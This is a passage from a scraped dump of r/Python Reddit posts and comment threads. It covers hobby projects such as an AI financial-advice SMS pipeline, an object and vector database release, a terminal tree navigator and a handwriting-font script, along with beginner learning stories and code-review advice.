    "post_content": "What My Project Does:\nI built a pipeline of Dagger modules to send my wife and I SMSs twice a week with actionable financial advice generated by AI based on data from bank accounts regarding our daily spending.\nDetails:\nDagger is an open source programmable CI/CD engine. I built each step in the pipeline as a Dagger method. Dagger spins up ephemeral containers, running everything within its own container. I use GitHub Actions to trigger dagger methods that;\nretrieve data from a source\nfilter for new transactions\nCategorizes transactions using a zero shot model, facebook/bart-large-mnli through the HuggingFace API. This process is optimized by sending data in dynamically sized batches asynchronously. \nWrites the data to a MongoDB database\nRetrieves the data, using Atlas search to aggregate the data by week and categories\nSends the data to openAI to generate financial advice. In this module, I implement a memory using LangChain. I store this memory in MongoDB to persist the memory between build runs. I designed the database to rewrite the data whenever I receive new data. The memory keeps track of feedback given, enabling the advice to improve based on feedback\nThis response is sent via SMS through the TextBelt API\nFull Blog: https://emmanuelsibanda.hashnode.dev/a-dagger-pipeline-sending-weekly-smss-with-financial-advice-generated-by-ai\nVideo Demo: https://youtu.be/S45n89gzH4Y\nGitHub Repo: https://github.com/EmmS21/daggerverse\nTarget Audience: Personal project (family and friends)\nComparison:\nWe have too many budgeting apps and wanted to receive this advice via SMS, personalizing it based on our changing financial goals\nA screenshot of the message sent: https://ibb.co/Qk1wXQK",
    "comments": [
        {
            "author": "Pork-S0da",
            "score": "166",
            "content": "Interesting project, but sounds like a privacy nightmare.",
            "replies": [
                {
                    "author": "enjoytheshow",
                    "score": "75",
                    "content": "Willingly shipping your financial data to OpenAI 💀"
                },
                {
                    "author": "regularparot",
                    "score": "28",
                    "content": "Big time."
                },
                {
                    "author": "No_Internal9345",
                    "score": "17",
                    "content": "Hoping for a llama-mix, laughed at trusting openai with personal data. Realized its not just openai, but also to a face hugger company and mongodb's cloud service and a text service. privacy nightmare indeed."
                },
                {
                    "author": "SniperDuty",
                    "score": "2",
                    "content": "Exactly, OP - use an on-device model.",
                    "replies": [
                        {
                            "author": "MoodAppropriate4108",
                            "score": "-1",
                            "content": "Out of curiosity why? Is it purely a question of what OpenAI could do with my data, what would be your reason for using an on-device model?"
                        }
                    ]
                }
            ]
        },
        {
            "author": "zsaziz",
            "score": "156",
            "content": "Unless I missed it, there is no example of the financial “advice” output received from OpenAI, in any of the links you provided. That is the main feature here, can you showcase it?",
            "replies": [
                {
                    "author": "[deleted]",
                    "score": "17",
                    "content": "\"You can save water cost by showering less. Don't call you parents, send an email instead. Bath water can be used to water house plants. You can save electricity by going to bed earlier.\""
                }
            ]
        },
        {
            "author": "VindoViper",
            "score": "121",
            "content": "Congratulations, you spammed yourself",
            "replies": [
                {
                    "author": "banana33noneleta",
                    "score": "24",
                    "content": "Nono. He spammed his wife. I'd be so mad with him."
                }
            ]
        },
        {
            "author": "Father_Dan",
            "score": "53",
            "content": "A whole lot of fluff and no real substance. Why don't you have a screenshot of some advice being given?"
        },
        {
            "author": "Cautious-Ad6043",
            "score": "16",
            "content": "I see you put significant work into this. How useful do you find it?"
        }
    ]
},
{
    "post_author": "AutoModerator",
    "post_id": "1d0p0iv",
    "post_score": "15",
    "post_time": "Sunday, May 26, 2024 at 3:00:10 AM GMT+3",
    "flair_text": "Daily Thread",
    "post_title": "Sunday Daily Thread: What's everyone working on this week?",
    "media": [],
    "post_content": "Daily Thread",
    "comments": [
        {
            "author": "Cautious-Ad6043",
            "score": "5",
            "content": "A 90% accuracy to predict stock prices 😂"
        },
        {
            "author": "zerothepyro",
            "score": "4",
            "content": "A script to hammer away at a soap server to show the legacy vendor that their system has yet another defect in the API. Because they prioritize issues in the production environment and their testing environment does not represent their production environment, I get to do this in production. Luckily the soap operations are just for creating or modifying a relationship between two objects. The last defect we identified in their API, only took 9ish months to be resolved and, instead of fixing their API for all consumers, they created a fix for it for just our environment. Oh the joys... 😑"
        },
        {
            "author": "tjdwill",
            "score": "1",
            "content": "I've been working on a toy project for responsive data, data that can respond to queries about itself. The idea was that it's easier for the data your looking for to respond to an inquiry rather than needing to iterate through the container yourself. I call it ActiveData, and it's been a nice way to begin learning about threads while also learning a bit of Hy."
        },
        {
            "author": "eddyizm",
            "score": "1",
            "content": "working on a toy project creating a api for quotes. put it away for 3 months and now i am struggling to update the container with a bunch of changes lol."
        },
        {
            "author": "coryalanfitz",
            "score": "1",
            "content": "I'm working on a way of simplifying your Python dependency management. Basically, it handles virtual environments so you don’t have to think about them. I wrote a twitter thread about it: https://x.com/cory_fitz/status/1794490033744859576 And you can also check it out here: https://pypi.org/project/crowbar-package-manager/… https://github.com/coryfitz/crowbar"
        },
        {
            "author": "Polaris44",
            "score": "1",
            "content": "Teaching myself Polars to test some efficiency differences with pandas for data stuff involving fuzzing and string matching."
        },
        {
            "author": "Savings_Push_5824",
            "score": "1",
            "content": "Working on An app to promote digital break I have created software to take a digital break, it will pop up a window every 1 hour for 1 minute (or whatever you set) with a GIF to practice deep breathing please check it out and help me test it find the image from https://github.com/RstEyeApp/rsteye/releases/tag/v1.1.2 or build it independently after following the instructions in README for your os."
        },
        {
            "author": "Beneficial_Expert448",
            "score": "1",
            "content": "I am working on a small package to detect if we are in a virtual environment. My goal is to use this project to have a full pipeline to make new releases and publish to Pypi.org automatically. I am also trying to add more features but the script is very trivial, so I will take any suggestion to add more functionnalities :) https://github.com/AlexMili/isVirtual"
        },
        {
            "author": "psycosmogrammer",
            "score": "1",
            "content": "I have created a video tutorial for someone looking into Selenium for Web Automation. I made sure you don't get bored by APIs and theories and took a real world example of assigning static IP to your devices on your home network. But would easily be translated to any other management UI. Here is a link to the tutorial if you are looking forward: https://www.youtube.com/watch?v=RuejHt0CXKE Those who already know Selenium, I'd like to have feedback on the video itself; as I have just started video creation journey."
        }
    ]
},
{
    "post_author": "Far-Simple189",
    "post_id": "zdpoi4",
    "post_score": "2353",
    "post_time": "Tuesday, December 6, 2022 at 3:33:18 AM GMT+3",
    "flair_text": "Discussion",
    "post_title": "at 44, I am struggling on Python for two months now but I keep at it. 2 hours a night, after the kids sleep, I work on it and will eventually be able to use it to get a better job, a better life for them.",
    "media": [],
    "post_content": "you got to accept to be bad at something to be good at it, right?\nRight? OK, I'll confess... I am posting here anonymously to ...IDK... find support, I guess. .. I can't give up.. for my kids, I need to succeed.\nI've done this and I am a bit proud. Very small step for you but for me, it is a big step.\ndef blackjackbis(n1:int, n2:int, n3:int) -> int:\nif sum((n1,n2,n3)) <= 21:\nreturn sum((n1,n2,n3))\nelif sum((n1,n2,n3))-10 <= 21 and 11 in (n1,n2,n3):\nreturn sum((n1,n2,n3)) - 10\nelse:\nreturn \"Bust\"\nthanks",
    "comments": [
        {
            "author": "Fingolfin734",
            "score": "419",
            "content": "Can i recommend something? I would save the tuple you've got there like this: sumnums = sum((n1, n2, n3)) Then, you can just refer back to sumnums whenever you mention it instead of writing it out every time. Keep it up! Lifetime learning ftw!",
            "replies": [
                {
                    "author": "Far-Simple189",
                    "score": "237",
                    "content": "of course! thanks. very good \"tup\" ;-)",
                    "replies": [
                        {
                            "author": "Fingolfin734",
                            "score": "133",
                            "content": "yw, dad Dad Sent from my iPhone"
                        },
                        {
                            "author": "[deleted]",
                            "score": "57",
                            "content": "DRY principle: don’t repeat yourself. If any code is repeating you are probably in the realm of writing poor code.",
                            "replies": [
                                {
                                    "author": "turkoid",
                                    "score": "29",
                                    "content": ""
                                },
                                {
                                    "author": "JanssonsFrestelse",
                                    "score": "9",
                                    "content": ""
                                },
                                {
                                    "author": "spinwizard69",
                                    "score": "1",
                                    "content": ""
                                }
                            ]
                        }
                    ]
                }
            ]
        },
        {
            "author": "[deleted]",
            "score": "",
            "content": "",
            "replies": [
                {
                    "author": "Far-Simple189",
                    "score": "49",
                    "content": ""
                }
            ]
        },
        {
            "author": "housesellout",
            "score": "147",
            "content": "Nice job. I work with python for years, so if you ever need help, feel free to DM me and I’ll give you my discord or Skype or whatever. I would recommend learning python via the command line, if you are not already doing so. It is a simple addition to start, simple to use side by side, and will make you 10x more valuable when you are ready. you are extremely lucky to be working for your kids ; )",
            "replies": [
                {
                    "author": "supreme_blorgon",
                    "score": "43",
                    "content": "I absolutely recommend people use a REPL when learning Python (and developing, I still keep a terminal open for quick prototyping when developing). One thing I'd suggest is to install ipython, which is a MUCH nicer REPL than the standard REPL with which Python ships."
                }
            ]
        },
        {
            "author": "Ok-Yogurtcloset377",
            "score": "98",
            "content": "💪Well done! I am struggling with Python for my kids’ future too. We will do it! 💪"
        },
        {
            "author": "JasonShort",
            "score": "48",
            "content": "Keep going. My wife went through a Python boot camp at 60! She is now working in data science. There are good jobs out there. And yea, you got to put in the time."
        },
        {
            "author": "[deleted]",
            "score": "61",
            "content": "Keep it up man! You might want to look into Markdown, so you can format your code in a reddit post better. Also maybe you should consider calculating the sum only once and saving it to a variable. There are some more little things you could improve, but very nice start!",
            "replies": [
                {
                    "author": "Far-Simple189",
                    "score": "22",
                    "content": "thanks man! I will. Thanks for the encouragements too. I really needed some."
                }
            ]
        }
    ]
},
{
    "post_author": "greenrobot_de",
    "post_id": "1d2iq74",
    "post_score": "57",
    "post_time": "Tuesday, May 28, 2024 at 3:52:21 PM GMT+3",
    "flair_text": "News",
    "post_title": "A \"new\" Object & Vector Database for Python",
    "media": [
        "https://objectbox.io/python-on-device-vector-and-object-database-for-local-ai/",
        "https://github.com/objectbox/objectbox-python"
    ],
    "post_content": "ObjectBox (GitHub) is an embedded database for Python objects and high-dimensional vectors. Today is it's first stable release for Python developers. It's very lightweight similar to SQLite, but built for objects so it's faster as there's no SQL layer in-between. It's the very first vector database that also runs on smaller low-memory devices. The article comes with first benchmarks and hints at the LangChain integration.",
    "comments": [
        {
            "author": "kaleenmiya",
            "score": "9",
            "content": "I am curious, can you please provide some use cases of your database.",
            "replies": [
                {
                    "author": "greenrobot_de",
                    "score": "6",
                    "content": "It's general purpose - except if you like SQL, it's not for you. If you prefer working with objects without the complexity/overhead of an ORM, it can be a good choice. It's embedded like SQLite (it runs inside your application/process), so one way of thinking of it is like \"SQLite - SQL + objects\". And there's vector search... This is an topic of its own; maybe you have seen Microsoft Recall (don't bother about the screenshots, more the general idea). It builds upon vector databases to allow semantic search, which is currently very popular with AI apps and LLM integration (\"RAG\"). This is only a rough overview, let me know if you have more specific questions.",
                    "replies": [
                        {
                            "author": "Rudd-X",
                            "score": "1",
                            "content": "This is like the ZODB (Zope object database) then? EDIT: yes it's a more manual ZODB.",
                            "replies": [
                                {
                                    "author": "greenrobot_de",
                                    "score": "0",
                                    "content": "Zope, that's like ages ago... Is that still used? Had a quick look; ZODB seems like more object-orient and rather slow. ObjectBox is built for performance (e.g. native core). Why \"manual\" ZODB?"
                                }
                            ]
                        }
                    ]
                }
            ]
        },
        {
            "author": "Pluto_underthedome",
            "score": "5",
            "content": "Yes but how to use for my Roku remote"
        },
        {
            "author": "greenrobot_de",
            "score": "1",
            "content": "Something I was always curious about: Python and \"build time tooling\". As Python is a dynamic language, this seems rather uncommon? Thus, Python is the only language supported by ObjectBox, that does not do code generation (at \"build time\"). Is this just the way it is or did I miss something?",
            "replies": [
                {
                    "author": "Rythoka",
                    "score": "2",
                    "content": "In my experience yeah, most Python developers shy away from build-time tooling. I've run into situations where I've wanted to use C-preprocessor-like macros for performance reasons, but there's not really an ecosystem for those sorts of tools out there."
                }
            ]
        },
        {
            "author": "FisterMister22",
            "score": "1",
            "content": "Does it supporort multiprocessing? I use the DB as the broker right between workers, each run in own process, if I can offload that from the DB that would be pretty great.",
            "replies": [
                {
                    "author": "banana33noneleta",
                    "score": "1",
                    "content": "I hope you don't expect any decent performances from this. Every hobby project claims to be light and fast, until someone does benchmarks."
                }
            ]
        },
        {
            "author": "databot_",
            "score": "1",
            "content": "Does this work with Chainlit?"
        },
        {
            "author": "kaleenmiya",
            "score": "1",
            "content": "You talk of performance, and I have been always told Python is not performant. How fast is the application. I am looking for non SQL DB which can do simple stuff for FAST API backends. How does this fit in?"
        },
        {
            "author": "Tony_Gunk_o7",
            "score": "1",
            "content": "Forgive me for my stupid question as I'm new to python. But is this a noSQL database? Like when you say it's objects, do you mean like JavaScript objects? If so, I could definitely see myself using this. I like how lightweight SQLite is, and that it lives in JavaScript, but sometimes I don't want to have a structured database. Instead it'd be cool to just save everything as objects."
        },
        {
            "author": "greenrobot_de",
            "score": "1",
            "content": "As one of its developers, please feel free to ask me anything! Foremost, we are eager to get some feedback from you! E.g. how do you like the new API? As we do not have to provide a mapping (this is not an ORM), we tried to make things a bit simpler than e.g. Django and SQLAlchemy. Then, what would you like to see in a Python-first vector database? Or do you all use LangChain/LlamaIndex wrappers anyway? What are we missing? What can be improved? Thanks a lot for having a look! PS.: https://github.com/objectbox/objectbox-python",
            "replies": [
                {
                    "author": "arden13",
                    "score": "22",
                    "content": "In your example code please do not use asterisk imports, but actually show the pieces of your package you are bringing in."
                }
            ]
        }
    ]
},
{
    "post_author": "AutoModerator",
    "post_id": "1cyf892",
    "post_score": "0",
    "post_time": "Thursday, May 23, 2024 at 3:00:09 AM GMT+3",
    "flair_text": "Daily Thread",
    "post_title": "Thursday Daily Thread: Python Careers, Courses, and Furthering Education!",
    "media": [],
    "post_content": "Daily Thread",
    "comments": []
},
{
    "post_author": "must1088",
    "post_id": "1d31sj6",
    "post_score": "3",
    "post_time": "Wednesday, May 29, 2024 at 5:40:50 AM GMT+3",
    "flair_text": "Showcase",
    "post_title": "musicnotes: Python module for playing musical instruments!\n",
    "media": [
        "https://github.com/must108/musicnotes"
    ],
    "post_content": "https://github.com/must108/musicnotes\nWhat My Project Does\nmusicnotes is a small open-source project that lets you play musical instruments (currently, only piano and guitar) in your Python programs. I created this project as I wanted to create a simple and useful open-source project for beginner developers to easily contribute to the project. I know it's hard to find good open-source projects for new developers.\nTarget Audience\nDevelopers looking to add sounds to small games, or just have fun while learning Python in general. This library could also be used to teach Python and coding in a fun way.\nThis project was also made to allow new Python developers to easily contribute to open-source! Feel free to star the repository, and download with pip install musicnotes! You can also create a pull request with any changes you find useful, and visit the GitHub repository if you find any setbacks while using this module. There are a few things that can be worked on listed in the README of the repository if you're looking for a place to get started.\nComparison\nThis project is very simple and easy to use, and is easy to contribute to as well, which is one of the primary goals of the project.",
    "comments": []
},
{
    "post_author": "RevolutionaryPen4661",
    "post_id": "1czbu57",
    "post_score": "15",
    "post_time": "Friday, May 24, 2024 at 6:53:03 AM GMT+3",
    "flair_text": "Discussion",
    "post_title": "JSX Syntax inside Python files. (Packed)",
    "media": [
        "https://github.com/michaeljones/packed"
    ],
    "post_content": "There was a JSX-style syntax preprocessor for Python called \"Packed,\" which allowed us to write JSX inside Python (*.pyx and *.py) files. It's unclear why they chose *.pyx for the file extension, as it conflicts with the naming of Cythonic file extensions (I have checked their issues). This project might have thrived with sufficient contributions and could have changed the way apps are built. However, the project is now archived on GitHub. The last commit was 5 years ago (LICENSE), and the last development commit was 9 years ago. This repository needs someone to revive it, but I don't have enough experience to take on that task. Even though I don't have enough information, we should start with Rust + Python to build a compiler (aka. template replacer) (this doesn't compile Python but replaces all JSX with a dictionary) and cleaner syntax. Integration with Django (Packed has an example too), Flask, FastAPI, Robyn etc.\nWe may also need plugins for the language server, I recommend supporting with *.pyh or *.psx (a fork renamed name) the extension file name (Derived from Python + HTML). VSCODE and NVIM Extensions are required to build support for this. The existing modern syntax of native Python will continue to support this syntax. I made a Handlebars Extension for the community back in the day of 2022 but I don't want to continue the development for it because later I disliked the syntax of handlebars (opinion, you're point of view may contrast with my thoughts). We can use emmet for writing easy HTML.\n@packed\ndef tag(self):\n    share = get_share_link()\n    return <a href={share}>Share on internet</a>\nThe main point of view is that somehow make returnable components as 👆\ninstead of doing this 👇\ndef app():\n    return div(div(p(\"Hello World\")),span(\"Not a Good Approach for someone (opinion)\"))",
    "comments": [
        {
            "author": "RevolutionaryPen4661",
            "score": "7",
            "content": "Dropbox has a similar project but uses Python2 only and is too old (12 years): https://github.com/dropbox/pyxl Though, we need a modern alternative.",
            "replies": [
                {
                    "author": "AndrewCHMcM",
                    "score": "2",
                    "content": "https://github.com/gvanrossum/pyxl3 https://github.com/pyxl4/pyxl4 https://github.com/twidi/mixt"
                }
            ]
        },
        {
            "author": "RevolutionaryPen4661",
            "score": "4",
            "content": "There are tons of features: Ability to use emmet for writing HTML inside Python Code Syntax Highlighting like JSX Auto Rename Tag Auto-complete for tags This will make it easier to build web apps than using nodejs"
        },
        {
            "author": "EducationalTie1946",
            "score": "2",
            "content": "From what i have seen the only thing we would need to do is have that rust compiler you recommend add strings to the jsx return and then compile the file into a pyc file. If you see how the module generates html it litterally just returns html as a plain string so you dont need to do much but make that compiler and the extentions for it in vscode and nvim So you can delete the to_html code and some other parts and get the same thing. It should provide much faster file generation",
            "replies": [
                {
                    "author": "RevolutionaryPen4661",
                    "score": "1",
                    "content": "You can do that, but just like \"go\" has templ (it enables Go developers to write direct HTML without strings or backticks inside the Go code) and the Python community needs one like this too. I believe that this may change how we develop apps nowadays. These are the pros of having this idea (scraped from templ docs): Server-side rendering: Deploy as a serverless function, Docker container, or standard Go program. Static rendering: Create static HTML files to deploy however you choose. Compiled code: Components are compiled into performant Go code. Use Go: Call any Go code, and use standard if, switch (match), and for statements. No JavaScript: This does not require any client or server-side JavaScript. Great developer experience: Ships with IDE autocompletion."
                }
            ]
        },
        {
            "author": "TheRealMrMatt",
            "score": "1",
            "content": "Its funny you broght this up RevolutionaryPen4661, with the recent hype around React Server Components (RSC) (and react 19), I had a similar thought. While I have not gotten very far (and web dev is a bit outside of my core expertise), I have started mocking up a simple library (if you can call what I have so far that) which uses: pydantic (state serialization/message protocol/html serialziation) react (for rendering the server sent components; I would have loved to use pyscript, but it seems pretty half baked ATM TBH) A custom parser (using lark) to convert the \"html\" to pydantic models a websocket for passing the components and events If you are interested on working on something like this, feel free to reach out (my name is Matt) and maybe we can combine our efforts to make web dev a reality in python.",
            "replies": [
                {
                    "author": "RevolutionaryPen4661",
                    "score": "1",
                    "content": "You won't believe I'm 16 years old who just fixed age-old code to make it work and made some performance improvements. I don't think I have enough experience to handle this. Even, I know only half of Django. I thought it would be a better idea to fork it and make one. I deleted nutritious (my perfect working fork). Since the dependencies were GPL-licensed I had to delete the project from GitHub yesterday (cuz no one wanted to make a web framework on that) and decided to start from new. I planned to introduce XML writing in Python (basically JSX). here's the fixed code: https://wastebin-1-f5614495.deta.app/doc/init%20file https://wastebin-1-f5614495.deta.app/doc/mjvjaykt"
                }
            ]
        }
    ]
},
{
    "post_author": "nginx26",
    "post_id": "1d11nfg",
    "post_score": "0",
    "post_time": "Sunday, May 26, 2024 at 4:42:43 PM GMT+3",
    "flair_text": "Showcase",
    "post_title": "AI planner: AI tool for efficient event scheduling in Google Calendar.",
    "media": [
        "https://github.com/ahnazary/AIPlanner",
        "https://github.com/ahnazary/AIPlanner#:~:text=Usage%20and%20Interfacing"
    ],
    "post_content": "Good evening! I have created a new projectfor adding events to google calendar based on the text a user inputs.\nWhat My Project Does\nThe project is a tool that uses large language models to understand the user's input and add events to the user's Google Calendar based on the user's input. It uses Ollama for natural language understanding and Google Calendar API for adding events to the user's calendar.\nHow My Project Works\nOllama uses Llama 3 with pre-instructions to act as a calendar event planner. The tool uses the model to generate responses to extract the event's details from the user's input inserted in the Web Interface. tool then asks the user to confirm the details extracted from the user's input and adds the event to the user's Google Calendar (example shown here)\nReferences\nCheckout my github repository AIPlanner for more details about the project.",
    "comments": [
        {
            "author": "b0ne123",
            "score": "8",
            "content": "All these little AI apps are weird. It would be faster to just open the calendar and to add it directly. The name field already has language processing. Typing sentences is a waste of time 95% if the time. ChatGPT has the same problem if you just ask it something. Google is faster and shorter",
            "replies": [
                {
                    "author": "chub79",
                    "score": "1",
                    "content": "I sort of agree. I like these tools poping up as a learning exercise but I don't find them ready to be used. The point of \"AI\" in the near future is to make things smoother and faster for me. But that kind of tools aren't doing that at all. They simply force me now to figure how to explain clearly enough what I need when it's way faster for me to open up the calendar. And I'm more precise."
                },
                {
                    "author": "echanuda",
                    "score": "1",
                    "content": "Honestly I think you’re wrong here. Especially if it accepts speech-to-text, it is far more useful. Google calendar and apple’s calendar both suck ass to use. If I can tell an app with my voice that I wanna set a date on a calendar with a reminder two days before and a specific time without going through the shitty UI, I will. Especially if I can just talk to my phone and have it done."
                }
            ]
        },
        {
            "author": "yrubooingmeimryte",
            "score": "2",
            "content": "Why wouldn't I just type all of this information into my calendar directly? Asking ChatGPT to parse text just to re-format it into JSON so that a separate API can ingest that seems like a lot of complication and hassle for literally no benefit."
        },
        {
            "author": "diggler4141",
            "score": "1",
            "content": "Well, this is coming to the iphone and everything else. It's annoying putting this into your calendar. I just want to tell my phone, hey, set up a meeting on this week. Use one of the regular meeting rooms and invite X and Y for one hour to discuss Z. Than it will find a time when everybody is available and one of he rooms are free. Cool project though, but the real innovation is not in the product, but in making it an integrated voice product for your devices. Thats why all these AI company wont win. Apple, Google etc. will just make them themself and it will be better because they have full access to your device and the user wont bother to add a app for each little thing."
        },
        {
            "author": "openwidecomeinside",
            "score": "1",
            "content": "Looks awesome, might contribute shortly"
        },
        {
            "author": "hobz462",
            "score": "1",
            "content": "Why wouldn’t I just use Google Assistant?"
        },
        {
            "author": "AH1376",
            "score": "0",
            "content": "Looks really interesting. Maybe also add docker compose to make the setup easier. Nevertheless, the idea behind it is cool.",
            "replies": [
                {
                    "author": "nginx26",
                    "score": "1",
                    "content": "Agree, will add it later on. how ever the google calendar setup cant be automated using docker compose."
                }
            ]
        },
        {
            "author": "ApprehensiveStand456",
            "score": "0",
            "content": "This sounds like I could be expand to something like a scheduling assistant for doctors and dentist."
        }
    ]
},
{
    "post_author": "lambda5x5",
    "post_id": "gmgezg",
    "post_score": "2332",
    "post_time": "Tuesday, May 19, 2020 at 6:03:43 AM GMT+3",
    "flair_text": "I Made This",
    "post_title": "After having this idea a while back and seeing yesterday's post with arduino controlled auto ambient lighting, I creating my own version with python!",
    "media": [
        "https://external-preview.redd.it/Hb6TFtCwrcKXNUYmoh8iK1pkNyZ9Gcn8zRuaZ8xohOo.png?width=640&crop=smart&format=pjpg&auto=webp&s=5a36f348ecf570732fdad58c63f4cefe18d04529"
    ],
    "post_content": "",
    "comments": [
        {
            "author": "Esk__",
            "score": "155",
            "content": "Geometry dash is the one game that has continually frustrated me to the point of throwing my phone, wanting to kick babies, and curse very VERY loudly in public more than other game. By a fuckass amount",
            "replies": [
                {
                    "author": "indiebryan",
                    "score": "51",
                    "content": "Back in my day this was \"The Impossible Game\" on the Xbox 360 store. I wonder what the original version of this is 🤔",
                    "replies": [
                        {
                            "author": "ADeepCeruleanBlue",
                            "score": "9",
                            "content": "I finished that shit with no checkpoints and to this day I can hear the first few notes of that fucking song in my head immediately if I try",
                            "replies": [
                                {
                                    "author": "indiebryan",
                                    "score": "5",
                                    "content": "ba ba ba ... ba .."
                                }
                            ]
                        },
                        {
                            "author": "Chazmer87",
                            "score": "2",
                            "content": "Cup head"
                        }
                    ]
                }
            ]
        },
        {
            "author": "lambda5x5",
            "score": "53",
            "content": "Github repo here",
            "replies": [
                {
                    "author": "Doyousketch2",
                    "score": "57",
                    "content": "try removing line 8. Don't think you need to actually save a .PNG every frame to return a color."
                },
                {
                    "author": "Tiktoor",
                    "score": "8",
                    "content": "I’m shit at Python atm, but will definitely reference this in the future. Seems like a fun project!"
                },
                {
                    "author": "SeriousSergio",
                    "score": "6",
                    "content": "whats the capturing framerate like? looks like you are relying on the network latency to slow it down. speaking of which, is the api... a local address? if not can you point to it locally?"
                }
            ]
        },
        {
            "author": "RytheFlyGuy1",
            "score": "14",
            "content": "This is awesome",
            "replies": [
                {
                    "author": "lambda5x5",
                    "score": "6",
                    "content": "Thanks!"
                }
            ]
        },
        {
            "author": "[deleted]",
            "score": "8",
            "content": "You can play Electrodynamix on that and you got yourself a disco"
        },
        {
            "author": "m4nolito",
            "score": "6",
            "content": "Nice! I was wondering about this for a couple of minutes, I haven't looked at the code yet. If you get the histogram of the image using a library like opencv I believe you can find the dominant color and use it as the background. It would work even for videos."
        }
    ]
},
{
    "post_author": "frankstan33",
    "post_id": "1cxfaph",
    "post_score": "27",
    "post_time": "Tuesday, May 21, 2024 at 9:42:04 PM GMT+3",
    "flair_text": "Showcase",
    "post_title": "I made a Traversible Tree in Python",
    "media": [
        "https://github.com/pranavpa8788/trav/tree/main",
        "https://streamable.com/ds911k"
    ],
    "post_content": "Comparison\nIt is inspired from the existing tree command on linux and windows too So basically it is just like the tree command, it shows you a tree of the current directory structure.\nWhat My Project Does\nIt basically gives you a birds eye view of your dir structure and quickly navigate to the folder you want to without having to know its path or doing cd ../../.. many times.\nThere are a bunch of command line args such as setting the paths, flags to show dot directories, set head height (no. of parent dirs shown) and tail height (depth).\nYou can traverse around the tree using various key presses (inspired from vim keybindings) and based on the given argument (-o, -c or --copy) you can output the value (the node to which you traversed), cd into it and have it copied into your clipboard.J\nI had created this for my assignment and had a lot of fun with it. Tried to implement as much clean code and good design as I could but its still a mess and active work in progress tbh (added unit tests lol). And the rendering is still a little slow.\nDo check it out: pranavpa8788/trav: A Traversible Tree command line program (github.com) and let me know what you guys think. It is built with support for Windows and Linux, some installation stuff might be needed though, and I'll update those steps soon in the github page\nTarget Audience\nFor anyone really, especially if you use a lot of terminal\n(Had to add the titles because my post was getting auto-deleted lol)\nLink to video demo: https://streamable.com/ds911k",
    "comments": [
        {
            "author": "binlargin",
            "score": "13",
            "content": "Cool project. Some suggestions if you decide to take it further: Add a script section to your pyproject so installing it gives you \"trav\" executable. example. (There's build pipelines for docs and for pypi in that repo that you can also use, so when you push a tag it publishes to pypi) For recording command line apps, try asciinema. Just a convention, admittedly not as great as it could/should be. Tab indent seems a bit severe by default! Try to cut down the flickering by moving the cursor relatively. Not expecting you to do all this, but you took the trouble to post it so it's only fair that you get a code review from someone in the industry: It's a bit verbose and java/c++, which is standard for people coming from C/C++/Java worlds. Takes a while to adjust to write pythonic code, but it's worth it. The goal of writing a program (IMO) is to write a language that can talk about the problem space. This is why naming things is the hardest problem in software, and that in turn is why we make silly rules up about clean code and design patterns to act as guidance, and language features to give us concepts. But the real goal is communication, so prioritise concepts over rules. You've got the logic skills for sure, and some good and respected tricks to split logic up. A life of worrying about names comes next 😂 We prefer verbs (functions) rather than ThingDoers in Python, which also makes the names of things more natural. Famous rant on this. Namespaces are good, use them as context, like lib.tree vs tree_lib. You can put objects in your __init__.py so the imports don't get too long. Consider snake_case method/function names and try to make them punchy. The location of the function, return types and parameters give you lots of info that you don't need to repeat. I focus on \"how would I use this phrase in a good python sentence?\", so leftmostSiblingNodeInSameLevel would be self.parent.children[0] or first(self.siblings). We let outsuders mess with our instance variables (prefix private ones with underscore). You can then use @property for computed/restricted attributes later. For example tree.setRootNode(node) becomes tree.root = node, and later on you can add a getter that returns self._node and a setter that sets it and does any checks and computations. curses could replace your terminal lib, if you don't mind the dependencies. It'd mean you don't need to worry about the OS or terminal. You can save the terminal state and restore it afterwards by using curses.wrapper(main), or just do relative movement. Consider argparse, click or typer for parsing your command line args in future. It'll get rid of the need for logic and loops, which are a source of bugs.",
            "replies": [
                {
                    "author": "frankstan33",
                    "score": "4",
                    "content": "Thanks a lot for the kind words and all the great advice (especially asciinema, was looking for something like this), I really appreciate it brother. Had a few questions and clarifications * You're absolutely spot on about the verbosity thing, you got me there. I had started coding in python eventually but have been using Java at work for the past half a year and that's why you see me naming things like this XD * I had thought about using curses and click. The reason I had not went with it was because of my assignment limitations, didn't want to explain about curses to my teacher and thought it'd impress him more when he saw I implemented some stuff from scratch. But now that my assignment is out of the way I can go ahead and use curses that would be much better. Didn't even realize it would get rid of the flickering. Thanks for pointing out * What do you mean by severe indentation? Like, should it have been spaces instead of tabs instead? * I didn't the get part regarding namespaces, should I have put all _lib folders under a lib folder so the imports would be from lib.tree import xyz? And by putting them in __init__ you mean like all common objects from that package (folder), so I can just do from lib import tree? * I definitely agree with the long as traversal names I have used, very verbose indeed. I like the first(self.siblings). The entire reason I didn't do this is that I'll need to add logic for args in register events part which I wanted to avoid, maybe its worth it I guess, will need to think about this * `@property` definitely seems very useful. But I've always had this doubt, why do we use private variables and method. I see the advantage of using setters by having the advantage of being able to check stuff before assigning value, but is that all?"
                }
            ]
        },
        {
            "author": "quuxman",
            "score": "2",
            "content": "Sounds a lot like fzf. Up vote for rolling your own",
            "replies": [
                {
                    "author": "frankstan33",
                    "score": "1",
                    "content": "Thanks, yeah I agree it is similar. Mine offers you a bird's eye view of the directory structure"
                }
            ]
        }
    ]
},
{
    "post_author": "sanidhya69",
    "post_id": "fofxnx",
    "post_score": "2238",
    "post_time": "Wednesday, March 25, 2020 at 2:43:11 AM GMT+3",
    "flair_text": "Help",
    "post_title": "I made my handwriting a font on Inkscape and used custom made python script to add random movment (in y axis) for each character. Looks fine or too suspicious?",
    "media": [
        "https://preview.redd.it/qm83ej0yipo41.jpg?width=640&crop=smart&auto=webp&s=2c6b8c12c7851836eef5da7adfcb6e26bba98108",
        "https://i.redd.it/qm83ej0yipo41.jpg"
    ],
    "post_content": "",
    "comments": [
        {
            "author": "i_am_the_atlas",
            "score": "711",
            "content": "the only thing that might be off if you're hoping to pass it as handwritten is the lack of variation between letters. maybe my writing is just a hot mess but i always switch up printing and writing as I go so the letters don't look identical in each word..",
            "replies": [
                {
                    "author": "TechnoRedneck",
                    "score": "331",
                    "content": "This is what I am thinking, the characters are literally the same so just add a few extra styles of each letter and make like 4 size variations of them all and it should be fine"
                },
                {
                    "author": "[deleted]",
                    "score": "",
                    "content": "Exactly what i was thinking, 🤔a generator returning a different style for a specified letter",
                    "replies": [
                        {
                            "author": "GickRick",
                            "score": "115",
                            "content": "Exactly what i was thinking, 🤔a generator returning a different style for a specified letter"
                        },
                        {
                            "author": "amphigraph",
                            "score": "72",
